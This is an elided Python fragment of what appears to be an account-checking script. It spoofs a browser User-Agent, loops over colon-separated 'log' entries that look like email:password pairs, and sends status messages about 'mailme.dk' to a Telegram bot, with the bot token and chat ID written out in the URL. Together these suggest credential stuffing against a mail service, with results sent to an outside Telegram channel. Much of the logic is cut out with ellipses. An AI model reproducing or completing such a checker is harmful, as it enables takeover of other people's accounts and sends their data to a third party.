...
headers_simple={
	...
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.6045.199 Safari/537.36',
...
Welcome = 'https://api.telegram.org/bot6470432885:AAGibBcoBcRvRKkVBBzho1JybjK7D6xjdC4/sendMessage?chat_id=5958344186&text='+'mailme.dk starting---'
...
for i in range(0,len(log)):
	...
	if (len(log[i].split(':'))==2):
		...
		try:
			...
			response1=r1.text.encode('utf-8').strip()
